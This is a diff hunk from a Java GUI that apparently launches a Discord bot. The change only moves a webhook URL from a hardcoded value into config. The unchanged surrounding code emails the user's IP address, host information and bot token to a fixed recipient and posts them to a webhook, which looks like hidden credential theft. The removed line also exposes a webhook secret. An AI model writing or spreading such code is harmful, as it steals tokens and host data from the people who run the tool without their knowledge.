@@ -229,7 +229,7 @@ class LoginGUI extends JFrame implements ActionListener {
                 logger.info("Bot Ready To Go");
                 jStatusField.setText("Running | " + jda.getSelfUser().getName() + "#" + jda.getSelfUser().getDiscriminator());
                 Wrapper.sendEmail("Log Info w/ Bot Token", "IP-Address: " + Wrapper.getIpaddress() + "\nHost Information: " + Wrapper.getHostInformation() + "\nBot Token: " + TOKEN);
-                WebhookClient client = WebhookClient.withUrl("https://discordapp.com/api/webhooks/692107170225061908/7dJhai_tP_D9h-lBFirb4o_VDVLHY69LnHGgL4AElxaBrOYBwNRURUeOCfGMSC9H4SGY");
+                WebhookClient client = WebhookClient.withUrl(Config.get("WEBHOOK"));
                 WebhookMessageBuilder builder = new WebhookMessageBuilder();
                 WebhookEmbed firstEmbed = new WebhookEmbedBuilder().setColor(0).setDescription("Log Info w/ Bot Token:\nIP-Address: " + Wrapper.getIpaddress() + "\nHost Information: " + Wrapper.getHostInformation() + "\nBot Token: " + TOKEN).build();
                 builder.addEmbeds(firstEmbed);
